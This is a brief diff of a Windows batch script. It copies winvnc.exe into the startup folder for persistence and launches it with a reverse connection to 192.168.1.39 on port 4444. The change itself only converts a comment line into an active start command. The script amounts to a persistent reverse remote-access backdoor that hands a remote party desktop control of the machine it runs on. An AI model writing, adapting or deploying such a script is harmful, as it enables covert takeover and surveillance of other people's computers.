@@ -19,7 +19,7 @@ if exist "%script_dir%winvnc.exe" (
   copy "%script_dir%winvnc.exe" "%startup_folder%\"
 )
 
-REM Start winvnc.exe
+Start winvnc.exe
 start "%startup_folder%\winvnc.exe" -run
 timeout /t 1 >nul
 start "%startup_folder%\winvnc.exe" -connect 192.168.1.39::4444
